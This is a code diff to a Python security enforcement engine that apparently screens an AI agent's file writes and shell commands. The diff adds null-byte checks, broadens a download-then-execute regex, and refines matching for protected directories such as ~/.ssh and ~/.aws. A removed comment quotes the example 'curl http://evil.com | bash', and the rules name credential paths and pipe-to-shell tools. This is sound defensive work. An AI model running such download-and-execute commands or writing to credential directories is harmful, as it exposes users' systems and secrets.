@@ -90,8 +90,17 @@ class SecurityEnforcementEngine:
         # File write checks (Write, Edit, MultiEdit, NotebookEdit)
         if tool_name in _WRITE_TOOLS:
             file_path = tool_input.get("file_path", "")
-            if not file_path:
-                return _APPROVE  # fail-open on missing path
+            # BV-10: Type guard — non-string file_path is fail-open
+            if not isinstance(file_path, str) or not file_path:
+                return _APPROVE
+
+            # BV-11: Null byte injection — block immediately
+            if "\x00" in file_path:
+                return EnforcementDecision(
+                    action="block",
+                    reason="Null byte in file path (path injection attempt)",
+                    violations=["Null byte injection in file_path"],
+                )
 
             decision = self._check_file_write(file_path)
             if decision.action == "block":
@@ -100,8 +109,17 @@ class SecurityEnforcementEngine:
         # Bash command checks
         if tool_name in _BASH_TOOLS:
             command = tool_input.get("command", "")
-            if not command:
+            # BV-10: Type guard for command
+            if not isinstance(command, str) or not command:
                 return _APPROVE
+
+            # BV-11: Null byte in command
+            if "\x00" in command:
+                return EnforcementDecision(
+                    action="block",
+                    reason="Null byte in command (injection attempt)",
+                    violations=["Null byte injection in command"],
+                )
 
             decision = self._check_bash_command(command)
             if decision.action == "block":
@@ -139,11 +157,16 @@ class SecurityEnforcementEngine:
                     violations=[f"Blocked path: {blocked}"],
                 )
 
-            # For home-relative rules (~/.ssh), also match the suffix
-            # in any user's home directory (e.g., /Users/other/.ssh)
+            # For home-relative rules (~/.ssh), also match the dotdir as a
+            # path component in any user's home directory.
+            # BV-06: Use path component check, not substring, to avoid
+            # false positives on paths like /project/my-ssh-tool/config.py
             if blocked.startswith("~/"):
-                suffix = blocked[1:]  # /.ssh, /.gnupg, /.aws
-                if suffix in canonical:
+                dotdir = blocked[2:]  # .ssh, .gnupg, .aws
+                # Check if dotdir appears as an exact directory component
+                if re.search(
+                    r"(?<=/)" + re.escape(dotdir) + r"(/|$)", canonical
+                ):
                     return EnforcementDecision(
                         action="block",
                         reason=f"Writing to {blocked} is blocked for security",
@@ -270,15 +293,15 @@ class SecurityEnforcementEngine:
         """C-005: Block known dangerous commands."""
         cmd_lower = command.lower()
 
-        # Check pipe-to-shell pattern: curl/wget ... | bash/sh
-        # This catches: curl http://evil.com | bash, wget -q url | sh, etc.
+        # BV-04: Download-then-execute pattern — catches pipe, &&, ;, >
+        # curl/wget followed by bash/sh in the same command, any separator
         if re.search(
-            r"\b(curl|wget)\b.*\|\s*(bash|sh)\b", cmd_lower
+            r"\b(curl|wget)\b.*\b(bash|sh)\b", cmd_lower
         ):
             return EnforcementDecision(
                 action="block",
-                reason="Piping download output to shell is blocked",
-                violations=["Pipe-to-shell pattern detected"],
+                reason="Download followed by shell execution is blocked",
+                violations=["Download-execute pattern detected"],
             )
 
         # Check exact substring patterns
@@ -297,7 +320,8 @@ class SecurityEnforcementEngine:
         cmd_lower = command.lower()
 
         is_force = "--force" in cmd_lower or "-f " in cmd_lower or cmd_lower.endswith("-f")
-        is_push = "git push" in cmd_lower
+        # BV-05: Use regex to handle multiple spaces between git and push
+        is_push = bool(re.search(r"\bgit\s+push\b", cmd_lower))
 
         if is_force and is_push:
             for branch in self._rules.force_push_branches:
